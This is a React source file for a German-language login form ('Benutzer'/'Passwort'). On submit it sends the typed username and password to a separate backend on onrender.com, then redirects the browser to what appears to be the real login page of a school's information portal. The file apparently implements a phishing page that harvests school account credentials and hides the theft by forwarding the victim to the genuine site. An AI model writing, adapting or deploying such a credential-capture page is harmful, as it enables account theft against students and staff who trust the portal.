import React, { useState } from "react";
import "./Login.css";

function LoginForm() {
  const [showPassword, setShowPassword] = useState(false);
  const [user, setUser] = useState("")
  const [password, setPassword] = useState("")

  const togglePassword = () => {
    setShowPassword((prev) => !prev);
  };

  const handleSubmit = async (e) => {
    e.preventDefault();
    const response = await fetch("https://backend-wvgi.onrender.com/login", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ user, password })
    })

    const data = await response.json();
    alert(data.message)
    window.location.href='https://schule-infoportal.de/login/siewuegym';
  }

  return (
    <form id="login-form" onSubmit={handleSubmit}>
      <div className="field">
        <label htmlFor="user">Benutzer</label>
        <input 
        type="text" 
        id="user" 
        name="user" 
        value={user} 
        onChange={(e) => setUser(e.target.value)}
        />
      </div>

      <div className="field">
        <label htmlFor="password">
          Passwort
          <span className="eye" onClick={togglePassword}>
            👁
          </span>
        </label>
        <input
          type={showPassword ? "text" : "password"}
          id="password"
          name="password"
          value={password}
          onChange={(e) => setPassword(e.target.value)}
        />
      </div>

      <div className="buttons">
        <button type="button" id="close_button">Beenden</button>
        <button type="submit">Anmelden</button>
      </div>
    </form>
  );
}

export default LoginForm;
